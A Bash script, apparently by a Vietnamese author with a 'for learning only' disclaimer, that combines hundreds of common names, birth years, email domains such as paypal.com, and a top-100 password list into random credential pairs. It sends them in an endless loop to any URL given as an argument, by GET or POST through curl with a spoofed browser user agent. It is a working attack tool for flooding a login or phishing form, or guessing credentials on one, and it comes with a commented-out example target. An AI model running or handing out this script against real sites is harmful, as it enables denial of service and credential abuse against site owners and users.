#!/bin/bash
#
#	Doan script nay phuc vu cho hoc tap, toi khong chiu bat cu tranh nhiem nao do no gay ra
#
if [ "$#" == "0" ]
	then
	echo "Xin hay nhap dich den "
	exit -1
	else
		dst="$1"
fi
method="GET" #chon menthod 
#dst="http://online-4tin.rhcloud.com/clips/login.php"
agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30"
NAME[0]="maiyeeuem"
NAME[1]="canada"
NAME[2]="hello"
NAME[3]="ranger"
NAME[4]="shadow"
NAME[5]="baseball"
NAME[6]="donald"
NAME[7]="harley"
NAME[8]="hockey"
NAME[9]="letmein"
NAME[10]="maggie"
NAME[11]="mike"
NAME[12]="mustang"
NAME[13]="snoopy"
NAME[14]="buster"
NAME[15]="dragon"
NAME[16]="jordan"
NAME[17]="michael"
NAME[18]="michelle"
NAME[19]="mindy"
NAME[20]="patrick"
NAME[21]="123abc"
NAME[22]="andrew"
NAME[23]="bear"
NAME[24]="calvin"
NAME[25]="changeme"
NAME[26]="diamond"
NAME[27]="fuckme"
NAME[28]="fuckyou"
NAME[29]="matthew"
NAME[30]="miller"
NAME[31]="ou812"
NAME[32]="tiger"
NAME[33]="trustno1"
NAME[34]="12345678"
NAME[35]="alex"
NAME[36]="apple"
NAME[37]="avalon"
NAME[38]="brandy"
NAME[39]="chelsea"
NAME[40]="coffee"
NAME[41]="dave"
NAME[42]="falcon"
NAME[43]="freedom"
NAME[44]="gandalf"
NAME[45]="golf"
NAME[46]="green"
NAME[47]="helpme"
NAME[48]="linda"
NAME[49]="magic"
NAME[50]="merlin"
NAME[51]="molson"
NAME[52]="newyork"
NAME[53]="soccer"
NAME[54]="thomas"
NAME[55]="wizard"
NAME[56]="Monday"
NAME[57]="asdfgh"
NAME[58]="bandit"
NAME[59]="batman"
NAME[60]="boris"
NAME[61]="butthead"
NAME[62]="dorothy"
NAME[63]="eeyore"
NAME[64]="fishing"
NAME[65]="football"
NAME[66]="george"
NAME[67]="happy"
NAME[68]="iloveyou"
NAME[69]="jennifer"
NAME[70]="jonathan"
NAME[71]="love"
NAME[72]="marina"
NAME[73]="master"
NAME[74]="missy"
NAME[75]="monday"
NAME[76]="monkey"
NAME[77]="natasha"
NAME[78]="ncc1701"
NAME[79]="newpass"
NAME[80]="pamela"
NAME[81]="pepper"
NAME[82]="piglet"
NAME[83]="poohbear"
NAME[84]="pookie"
NAME[85]="rabbit"
NAME[86]="rachel"
NAME[87]="rocket"
NAME[88]="rose"
NAME[89]="smile"
NAME[90]="sparky"
NAME[91]="spring"
NAME[92]="steven"
NAME[93]="success"
NAME[94]="sunshine"
NAME[95]="thx1138"
NAME[96]="victoria"
NAME[97]="whatever"
NAME[98]="zapata"
NAME[99]="12143442"
NAME[100]="8675309"
NAME[101]="Internet"
NAME[102]="amanda"
NAME[103]="andy"
NAME[104]="angel"
NAME[105]="august"
NAME[106]="barney"
NAME[107]="biteme"
NAME[108]="boomer"
NAME[109]="brian"
NAME[110]="casey"
NAME[111]="coke"
NAME[112]="cowboy"
NAME[113]="delta"
NAME[114]="doctor"
NAME[115]="fisher"
NAME[116]="foobar"
NAME[117]="island"
NAME[118]="john"
NAME[119]="joshua"
NAME[120]="karen"
NAME[121]="marley"
NAME[122]="orange"
NAME[123]="please"
NAME[124]="rascal"
NAME[125]="richard"
NAME[126]="sarah"
NAME[127]="scooter"
NAME[128]="shalom"
NAME[129]="silver"
NAME[130]="skippy"
NAME[131]="stanley"
NAME[132]="taylor"
NAME[133]="welcome"
NAME[134]="zephyr"
NAME[135]="111111"
NAME[136]="1928"
NAME[137]="aaaaaa"
NAME[138]="abc"
NAME[139]="access"
NAME[140]="albert"
NAME[141]="alexander"
NAME[142]="andrea"
NAME[143]="anna"
NAME[144]="anthony"
NAME[145]="asdfjkl"
NAME[146]="ashley"
NAME[147]="basf"
NAME[148]="basketball"
NAME[149]="beavis"
NAME[150]="black"
NAME[151]="bob"
NAME[152]="booboo"
NAME[153]="bradley"
NAME[154]="brandon"
NAME[155]="buddy"
NAME[156]="caitlin"
NAME[157]="camaro"
NAME[158]="charlie"
NAME[159]="chicken"
NAME[160]="chris"
NAME[161]="cindy"
NAME[162]="cricket"
NAME[163]="dakota"
NAME[164]="dallas"
NAME[165]="daniel"
NAME[166]="david"
NAME[167]="debbie"
NAME[168]="dolphin"
NAME[169]="elephant"
NAME[170]="emily"
NAME[171]="fish"
NAME[172]="fred"
NAME[173]="friend"
NAME[174]="fucker"
NAME[175]="ginger"
NAME[176]="goodluck"
NAME[177]="hammer"
NAME[178]="heather"
NAME[179]="help"
NAME[180]="iceman"
NAME[181]="jason"
NAME[182]="jessica"
NAME[183]="jesus"
NAME[184]="joseph"
NAME[185]="jupiter"
NAME[186]="justin"
NAME[187]="kevin"
NAME[188]="knight"
NAME[189]="lacrosse"
NAME[190]="lakers"
NAME[191]="lizard"
NAME[192]="madison"
NAME[193]="mary"
NAME[194]="mother"
NAME[195]="muffin"
NAME[196]="murphy"
NAME[197]="ncc1701d"
NAME[198]="newuser"
NAME[199]="nirvana"
NAME[200]="none"
NAME[201]="paris"
NAME[202]="pat"
NAME[203]="pentium"
NAME[204]="phoenix"
NAME[205]="picture"
NAME[206]="rainbow"
NAME[207]="sandy"
NAME[208]="saturn"
NAME[209]="scott"
NAME[210]="shannon"
NAME[211]="shithead"
NAME[212]="skeeter"
NAME[213]="sophie"
NAME[214]="special"
NAME[215]="stephanie"
NAME[216]="stephen"
NAME[217]="steve"
NAME[218]="sweetie"
NAME[219]="teacher"
NAME[220]="tennis"
NAME[221]="test123"
NAME[222]="tommy"
NAME[223]="topgun"
NAME[224]="tristan"
NAME[225]="wally"
NAME[226]="william"
NAME[227]="wilson"
NAME[228]="1q2w3e"
NAME[229]="654321"
NAME[230]="666666"
NAME[231]="777"
NAME[232]="a12345"
NAME[233]="a1b2c3d4"
NAME[234]="alpha"
NAME[235]="amber"
NAME[236]="angela"
NAME[237]="angie"
NAME[238]="archie"
NAME[239]="asdf"
NAME[240]="blazer"
NAME[241]="bond007"
NAME[242]="booger"
NAME[243]="charles"
NAME[244]="christin"
NAME[245]="claire"
NAME[246]="control"
NAME[247]="danny"
NAME[248]="david1"
NAME[249]="dennis"
NAME[250]="digital"
NAME[251]="disney"
NAME[252]="dog"
NAME[253]="duck"
NAME[254]="duke"
NAME[255]="edward"
NAME[256]="elvis"
NAME[257]="felix"
NAME[258]="flipper"
NAME[259]="floyd"
NAME[260]="franklin"
NAME[261]="frodo"
NAME[262]="guest"
NAME[263]="honda"
NAME[264]="horses"
NAME[265]="hunter"
NAME[266]="indigo"
NAME[267]="info"
NAME[268]="james"
NAME[269]="jasper"
NAME[270]="jeremy"
NAME[271]="joe"
NAME[272]="julian"
NAME[273]="kelsey"
NAME[274]="killer"
NAME[275]="kingfish"
NAME[276]="lauren"
NAME[277]="marie"
NAME[278]="maryjane"
NAME[279]="matrix"
NAME[280]="maverick"
NAME[281]="mayday"
NAME[282]="mercury"
NAME[283]="micro"
NAME[284]="mitchell"
NAME[285]="morgan"
NAME[286]="mountain"
NAME[287]="niners"
NAME[288]="nothing"
NAME[289]="oliver"
NAME[290]="peace"
NAME[291]="peanut"
NAME[292]="pearljam"
NAME[293]="phantom"
NAME[294]="popcorn"
NAME[295]="princess"
NAME[296]="psycho"
NAME[297]="pumpkin"
NAME[298]="purple"
NAME[299]="randy"
NAME[300]="rebecca"
NAME[301]="reddog"
NAME[302]="robert"
NAME[303]="rocky"
NAME[304]="roses"
NAME[305]="salmon"
NAME[306]="sam"
NAME[307]="samson"
NAME[308]="sharon"
NAME[309]="sierra"
NAME[310]="smokey"
NAME[311]="startrek"
NAME[312]="steelers"
NAME[313]="stimpy"
NAME[314]="sunflower"
NAME[315]="superman"
NAME[316]="support"
NAME[317]="sydney"
NAME[318]="techno"
NAME[319]="telecom"
NAME[320]="test1"
NAME[321]="walter"
NAME[322]="willie"
NAME[323]="willow"
NAME[324]="winner"
NAME[325]="ziggy"
NAME[326]="zxcvbnm"
NAME[327]="7777"
NAME[328]="OU812"
NAME[329]="a"
NAME[330]="absolut"
NAME[331]="alaska"
NAME[332]="alexis"
NAME[333]="alice"
NAME[334]="animal"
NAME[335]="apples"
NAME[336]="babylon5"
NAME[337]="backup"
NAME[338]="barbara"
NAME[339]="benjamin"
NAME[340]="bill"
NAME[341]="billy"
NAME[342]="bird33"
NAME[343]="blue"
NAME[344]="bluebird"
NAME[345]="bobby"
NAME[346]="bonnie"
NAME[347]="bubba"
NAME[348]="camera"
NAME[349]="chocolate"
NAME[350]="clark"
NAME[351]="claudia"
NAME[352]="cocacola"
NAME[353]="compton"
NAME[354]="connect"
NAME[355]="cookie"
NAME[356]="cruise"
NAME[357]="deliver"
NAME[358]="douglas"
NAME[359]="dreamer"
NAME[360]="dreams"
NAME[361]="duckie"
NAME[362]="eagles"
NAME[363]="eddie"
NAME[364]="einstein"
NAME[365]="enter"
NAME[366]="explorer"
NAME[367]="faith"
NAME[368]="family"
NAME[369]="ferrari"
NAME[370]="fire"
NAME[371]="flamingo"
NAME[372]="flip"
NAME[373]="flower"
NAME[374]="foxtrot"
NAME[375]="francis"
NAME[376]="freddy"
NAME[377]="friday"
NAME[378]="froggy"
NAME[379]="galileo"
NAME[380]="giants"
NAME[381]="gizmo"
NAME[382]="global"
NAME[383]="goofy"
NAME[384]="gopher"
NAME[385]="hansolo"
NAME[386]="happy1"
NAME[387]="hendrix"
NAME[388]="henry"
NAME[389]="herman"
NAME[390]="homer"
NAME[391]="honey"
NAME[392]="house"
NAME[393]="houston"
NAME[394]="iguana"
NAME[395]="indiana"
NAME[396]="insane"
NAME[397]="inside"
NAME[398]="irish"
NAME[399]="ironman"
NAME[400]="jake"
NAME[401]="jane"
NAME[402]="jasmin"
NAME[403]="jeanne"
NAME[404]="jerry"
NAME[405]="jim"
NAME[406]="joey"
NAME[407]="justice"
NAME[408]="katherine"
NAME[409]="kermit"
NAME[410]="kitty"
NAME[411]="koala"
NAME[412]="larry"
NAME[413]="leslie"
NAME[414]="logan"
NAME[415]="lucky"
NAME[416]="mark"
NAME[417]="martin"
NAME[418]="matt"
NAME[419]="minnie"
NAME[420]="misty"
NAME[421]="mitch"
NAME[422]="mom"
NAME[423]="mouse"
NAME[424]="nancy"
NAME[425]="nascar"
NAME[426]="nelson"
NAME[427]="netware"
NAME[428]="pantera"
NAME[429]="parker"
NAME[430]="passwd"
NAME[431]="penguin"
NAME[432]="peter"
NAME[433]="phil"
NAME[434]="phish"
NAME[435]="piano"
NAME[436]="pizza"
NAME[437]="porsche911"
NAME[438]="prince"
NAME[439]="punkin"
NAME[440]="pyramid"
NAME[441]="rain"
NAME[442]="raymond"
NAME[443]="red"
NAME[444]="robin"
NAME[445]="Zara"
NAME[446]="Qadir"
NAME[447]="Mahnaz"
NAME[448]="Ayan"
NAME[449]="Daisy"
NAME[450]="henry"
NAME[451]="tuan"
NAME[452]="thanhpham"
NAME[453]="hang"
NAME[454]="thanhtung"
NAME[455]="thanhtuan"
NAME[456]="phamhuynh"
NAME[457]="tranphamnhatrang"
NAME[458]="adeptrai"
NAME[459]="crazydog"
NAME[460]="thichthinhich"
NAME[461]="onemore"
NAME[462]="wtfhung"
NAME[463]="diemtrang"
NAME[464]="tranglolita"
NAME[465]="langtham"
NAME[466]="nuhonngotngao"
NAME[467]="samsung"
NAME[468]="tranhthanhvu"
NAME[469]="cuti"
NAME[470]="maibenem"
NAME[471]="langle"
NAME[472]="noname"
NAME[473]="huynhdung"
NAME[474]="lamhung"
NAME[475]="roger"
NAME[476]="rosebud"
NAME[477]="route66"
NAME[478]="royal"
NAME[479]="running"
NAME[480]="sadie"
NAME[481]="sasha"
NAME[482]="security"
NAME[483]="sergei"
NAME[484]="sheena"
NAME[485]="sheila"
NAME[486]="skiing"
NAME[487]="snapple"
NAME[488]="snowball"
NAME[489]="sparrow"
NAME[490]="spencer"
NAME[491]="spike"
NAME[492]="star"
NAME[493]="stealth"
NAME[494]="student"
NAME[495]="sun"
NAME[496]="sunny"
NAME[497]="sylvia"
NAME[498]="tamara"
NAME[499]="taurus"
NAME[500]="tech"
NAME[501]="teresa"
NAME[502]="theresa"
NAME[503]="thunderbird"
NAME[504]="tigers"
NAME[505]="tony"
NAME[506]="toyota"
NAME[507]="training"
NAME[508]="travel"
NAME[509]="truck"
NAME[510]="tuesday"
NAME[511]="victory"
NAME[512]="video"
NAME[513]="viper1"
NAME[514]="volvo"
NAME[515]="wesley"
NAME[516]="whisky"
NAME[517]="winnie"
NAME[518]="winter"
NAME[519]="wolves"
NAME[520]="xyz123"
NAME[521]="zorro"
NAME[522]="!@#$%"
NAME[523]="7sadsad"
NAME[524]="123123"
NAME[525]="1234567"
NAME[526]="1969"
NAME[527]="5683"
NAME[528]="696969"
NAME[529]="888888"
NAME[530]="Anthony"
NAME[531]="Bond007"
NAME[532]="Friday"
NAME[533]="Hendrix"
NAME[534]="Joshua"
NAME[535]="Matthew"
NAME[536]="October"
NAME[537]="Taurus"
NAME[538]="Tigger"
NAME[539]="aaa"
NAME[540]="aaron"
NAME[541]="abby"
NAME[542]="abcdef"
NAME[543]="adidas"
NAME[544]="adrian"
NAME[545]="alexandr"
NAME[546]="alfred"
NAME[547]="arthur"
NAME[548]="athena"
NAME[549]="austin"
NAME[550]="awesome"
NAME[551]="badger"
NAME[552]="bamboo"
NAME[553]="beagle"
NAME[554]="bears"
NAME[555]="beatles"
NAME[556]="beautiful"
NAME[557]="beaver"
NAME[558]="benny"
NAME[559]="bigmac"
NAME[560]="bingo"
NAME[561]="bitch"
NAME[562]="blonde"
NAME[563]="boogie"
NAME[564]="boston"
NAME[565]="brenda"
NAME[566]="bright"
NAME[567]="bubba1"
NAME[568]="bubbles"
NAME[569]="buffy"
NAME[570]="button"
NAME[571]="buttons"
NAME[572]="cactus"
NAME[573]="candy"
NAME[574]="captain"
NAME[575]="carlos"
NAME[576]="caroline"
NAME[577]="carrie"
NAME[578]="casper"
NAME[579]="catalog"
NAME[580]="catch22"
NAME[581]="challenge"
NAME[582]="chance"
NAME[583]="charity"
NAME[584]="charlotte"
NAME[585]="cheese"
NAME[586]="cheryl"
NAME[587]="chloe"
NAME[588]="chris1"
NAME[589]="clancy"
NAME[590]="clipper"
NAME[591]="coltrane"
NAME[592]="compaq"
NAME[593]="conrad"
NAME[594]="cooper"
NAME[595]="cooter"
NAME[596]="copper"
NAME[597]="cosmos"
NAME[598]="cougar"
NAME[599]="cracker"
NAME[600]="crawford"
NAME[601]="crystal"
NAME[602]="curtis"
NAME[603]="cyclone"
NAME[604]="cyrano"
NAME[605]="dan"
NAME[606]="dance"
NAME[607]="dawn"
NAME[608]="dean"
NAME[609]="deutsch"
NAME[610]="diablo"
NAME[611]="dilbert"
NAME[612]="dollars"
NAME[613]="dookie"
NAME[614]="doom"
NAME[615]="dumbass"
NAME[616]="dundee"
NAME[617]="email"
NAME[618]="elizabeth"
NAME[619]="eric"
NAME[620]="europe"
NAME[621]="export"
NAME[622]="farmer"
NAME[623]="firebird"
NAME[624]="fletcher"
NAME[625]="fluffy"
NAME[626]="ford"
NAME[627]="fountain"
NAME[628]="fox"
NAME[629]="france"
NAME[630]="freak1"
NAME[631]="friends"
NAME[632]="frog"
NAME[633]="fuckoff"
NAME[634]="gabriel"
NAME[635]="gabriell"
NAME[636]="galaxy"
NAME[637]="gambit"
NAME[638]="garden"
NAME[639]="garfield"
NAME[640]="garlic"
NAME[641]="garnet"
NAME[642]="genesis"
NAME[643]="genius"
NAME[644]="godzilla"
NAME[645]="goforit"
NAME[646]="golfer"
NAME[647]="goober"
NAME[648]="grace"
NAME[649]="grateful"
NAME[650]="greenday"
NAME[651]="groovy"
NAME[652]="grover"
NAME[653]="guitar"
NAME[654]="hacker"
NAME[655]="harry"
NAME[656]="hazel"
NAME[657]="hector"
NAME[658]="herbert"
NAME[659]="hoops"
NAME[660]="horizon"
NAME[661]="hornet"
NAME[662]="howard"
NAME[663]="icecream"
NAME[664]="imagine"
NAME[665]="impala"
NAME[666]="informix"
NAME[667]="jack"
NAME[668]="janice"
NAME[669]="jasmine"
NAME[670]="jason1"
NAME[671]="jeanette"
NAME[672]="jeffrey"
NAME[673]="jenifer"
NAME[674]="jenni"
NAME[675]="jesus1"
NAME[676]="jewels"
NAME[677]="joker"
NAME[678]="julie"
NAME[679]="julie1"
NAME[680]="junior"
NAME[681]="justin1"
NAME[682]="kathleen"
NAME[683]="keith"
NAME[684]="kelly"
NAME[685]="kelly1"
NAME[686]="kennedy"
NAME[687]="kevin1"
NAME[688]="knicks"
NAME[689]="lady"
NAME[690]="larry1"
NAME[691]="ledzep"
NAME[692]="lee"
NAME[693]="leonard"
NAME[694]="lestat"
NAME[695]="library"
NAME[696]="lincoln"
NAME[697]="lionking"
NAME[698]="london"
NAME[699]="louise"
NAME[700]="lucky1"
NAME[701]="lucy"
NAME[702]="maddog"
NAME[703]="mailman"
NAME[704]="majordomo"
NAME[705]="mantra"
NAME[706]="margaret"
NAME[707]="mariposa"
NAME[708]="market"
NAME[709]="marlboro"
NAME[710]="martin1"
NAME[711]="marty"
NAME[712]="master1"
NAME[713]="mazda1"
NAME[714]="mensuck"
NAME[715]="mercedes"
NAME[716]="metal"
NAME[717]="metallic"
NAME[718]="midori"
NAME[719]="mikey"
NAME[720]="millie"
NAME[721]="mirage"
NAME[722]="mmm"
NAME[723]="molly"
NAME[724]="monet"
NAME[725]="money1"
NAME[726]="monica"
NAME[727]="monopoly"
NAME[728]="mookie"
NAME[729]="moose"
NAME[730]="moroni"
NAME[731]="music"
NAME[732]="naomi"
NAME[733]="nathan"
NAME[734]="ncc1701e"
NAME[735]="nesbitt"
NAME[736]="news"
NAME[737]="nguyen"
NAME[738]="nicholas"
NAME[739]="nicole"
NAME[740]="nimrod"
NAME[741]="october"
NAME[742]="olive"
NAME[743]="olivia"
NAME[744]="one"
NAME[745]="online"
NAME[746]="open"
NAME[747]="oscar"
NAME[748]="oxford"
NAME[749]="pacific"
NAME[750]="painter"
NAME[751]="peaches"
NAME[752]="penelope"
NAME[753]="pepsi"
NAME[754]="pete"
NAME[755]="petunia"
NAME[756]="philip"
NAME[757]="phoenix1"
NAME[758]="photo"
NAME[759]="pickle"
NAME[760]="player"
NAME[761]="poiuyt"
NAME[762]="porsche"
NAME[763]="porter"
NAME[764]="ppp"
NAME[765]="puppy"
NAME[766]="python"
NAME[767]="quality"
NAME[768]="quest"
NAME[769]="raquel"
NAME[770]="raven"
NAME[771]="remember"
NAME[772]="republic"
NAME[773]="research"
NAME[774]="robbie"
NAME[775]="robert1"
NAME[776]="roman"
NAME[777]="rugby"
NAME[778]="runner"
NAME[779]="russell"
NAME[780]="ryan"
NAME[781]="sailing"
NAME[782]="sailor"
NAME[783]="samantha"
NAME[784]="savage"
NAME[785]="sbdc"
NAME[786]="scarlett"
NAME[787]="school"
NAME[788]="sean"
NAME[789]="seven"
NAME[790]="shadow1"
NAME[791]="sheba"
NAME[792]="shelby"
NAME[793]="shit"
NAME[794]="shoes"
NAME[795]="simba"
NAME[796]="simple"
NAME[797]="skipper"
NAME[798]="smiley"
NAME[799]="snake"
NAME[800]="snickers"
NAME[801]="sniper"
NAME[802]="snoopdog"
NAME[803]="snowman"
NAME[804]="sonic"
NAME[805]="spitfire"
NAME[806]="sprite"
NAME[807]="spunky"
NAME[808]="starwars"
NAME[809]="station"
NAME[810]="stella"
NAME[811]="stingray"
NAME[812]="storm"
NAME[813]="stormy"
NAME[814]="stupid"
NAME[815]="sumuinen"
NAME[816]="sunny1"
NAME[817]="sunrise"
NAME[818]="supra"
NAME[819]="surfer"
NAME[820]="susan"
NAME[821]="tammy"
NAME[822]="tango"
NAME[823]="tanya"
NAME[824]="tara"
NAME[825]="teddy1"
NAME[826]="temp"
NAME[827]="testing"
NAME[828]="theboss"
NAME[829]="theking"
NAME[830]="thumper"
NAME[831]="tina"
NAME[832]="tintin"
NAME[833]="tomcat"
NAME[834]="trebor"
NAME[835]="trek"
NAME[836]="trevor"
NAME[837]="tweety"
NAME[838]="unicorn"
NAME[839]="valentine"
NAME[840]="valerie"
NAME[841]="vanilla"
NAME[842]="veronica"
NAME[843]="victor"
NAME[844]="vincent"
NAME[845]="viper"
NAME[846]="warrior"
NAME[847]="warriors"
NAME[848]="weasel"
NAME[849]="wheels"
NAME[850]="wilbur"
NAME[851]="winston"
NAME[852]="wisdom"
NAME[853]="wombat"
NAME[854]="xanadu"
NAME[855]="xavier"
NAME[856]="xxxx"
NAME[857]="yellow"
NAME[858]="zaphod"
NAME[859]="zeppelin"
NAME[860]="zeus"
NAMELENGHT=${#NAME[@]}
#######ten mien
domain[0]="@yahoo.com"
domain[1]="@gmail.com"
domain[2]="@paypal.com"
domain[3]="@hotmail.com"
domainLENGHT=${#domain[@]}

##Random tat ca, NAME+year+domain
##pass
pass[0]="123456"
pass[1]="password"
pass[2]="12345678"
pass[3]="qwerty"
pass[4]="123456789"
pass[5]="12345"
pass[6]="1234"
pass[7]="111111"
pass[8]="1234567"
pass[9]="dragon"
pass[10]="123123"
pass[11]="baseball"
pass[12]="abc123"
pass[13]="football"
pass[14]="monkey"
pass[15]="letmein"
pass[16]="696969"
pass[17]="shadow"
pass[18]="master"
pass[19]="666666"
pass[20]="qwertyuiop"
pass[21]="123321"
pass[22]="mustang"
pass[23]="1234567890"
pass[24]="michael"
pass[25]="654321"
pass[26]="pussy"
pass[27]="superman"
pass[28]="1qaz2wsx"
pass[29]="7777777"
pass[30]="fuckyou"
pass[31]="121212"
pass[32]="000000"
pass[33]="qazwsx"
pass[34]="123qwe"
pass[35]="killer"
pass[36]="trustno1"
pass[37]="jordan"
pass[38]="jennifer"
pass[39]="zxcvbnm"
pass[40]="asdfgh"
pass[41]="hunter"
pass[42]="buster"
pass[43]="soccer"
pass[44]="harley"
pass[45]="batman"
pass[46]="andrew"
pass[47]="tigger"
pass[48]="sunshine"
pass[49]="iloveyou"
pass[50]="fuckme"
pass[51]="2000"
pass[52]="charlie"
pass[53]="robert"
pass[54]="thomas"
pass[55]="hockey"
pass[56]="ranger"
pass[57]="daniel"
pass[58]="starwars"
pass[59]="klaster"
pass[60]="112233"
pass[61]="george"
pass[62]="asshole"
pass[63]="computer"
pass[64]="michelle"
pass[65]="jessica"
pass[66]="pepper"
pass[67]="1111"
pass[68]="zxcvbn"
pass[69]="555555"
pass[70]="11111111"
pass[71]="131313"
pass[72]="freedom"
pass[73]="777777"
pass[74]="pass"
pass[75]="fuck"
pass[76]="maggie"
pass[77]="159753"
pass[78]="aaaaaa"
pass[79]="ginger"
pass[80]="princess"
pass[81]="joshua"
pass[82]="cheese"
pass[83]="amanda"
pass[84]="summer"
pass[85]="love"
pass[86]="ashley"
pass[87]="6969"
pass[88]="nicole"
pass[89]="chelsea"
pass[90]="biteme"
pass[91]="matthew"
pass[92]="access"
pass[93]="yankees"
pass[94]="987654321"
pass[95]="dallas"
pass[96]="austin"
pass[97]="thunder"
pass[98]="taylor"
pass[99]="matrix"
passLENGHT=${#pass[@]}
for ((i = 0; i <= 32; i++))#32 nam 
do
	year[i]=$((1970+$i))
done
#start post, chon Random data
while [[ true ]]; do
	#statements
	acc="${NAME[$(shuf -i 0-$NAMELENGHT -n 1)]}${year[$(shuf -i 0-32 -n 1)]}${domain[$(shuf -i 0-$domainLENGHT -n 1)]}";
    pas="${pass[$(shuf -i 0-$passLENGHT -n 1)]}";
    echo "Random in rang: $acc $pas";

    if [ "${method}" == "POST" ]
    then
    	curl -A $agent -X POST --data "email=$acc&pass=$pas" $dst;
    elif [ "$method" == "GET" ]
    	then

    	curl -A "$agent" -v "$dst?email=$acc&pass=$pas";
    else
    	echo "Khong ho tro phuong thuc nay! dung GET or POST";
    fi
done